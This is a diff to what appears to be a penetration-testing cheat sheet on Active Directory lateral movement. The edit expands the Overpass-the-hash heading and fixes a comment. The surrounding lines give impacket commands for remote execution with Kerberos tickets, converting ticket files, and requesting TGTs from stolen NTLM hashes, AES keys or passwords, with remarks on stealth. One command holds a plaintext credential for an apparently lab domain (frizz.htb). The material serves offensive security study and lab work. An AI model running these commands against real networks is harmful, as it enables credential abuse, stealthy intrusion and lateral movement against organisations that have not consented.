@@ -316,12 +316,12 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 impacket-ticket_converter ticket.kirbi ticket.ccache
 impacket-ticket_converter ticket.ccache ticket.kirbi
 ```
-### Overpass-the-hash
+### Overpass-the-hash(for Kerberos-Only login or users in "Protected Users" group or Double-Hop or for stealth )
 >transfer hash to TGT ticket file, then authenticate as that user to move laterally
 ```
 # Request the TGT with hash
 python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
-# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
+# Request the TGT with aesKey (more secure encryption, probably more stealth due to it is the used by default by Microsoft)
 python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
 # Request the TGT with password
 impacket-getTGT -dc-ip 10.10.11.60 frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
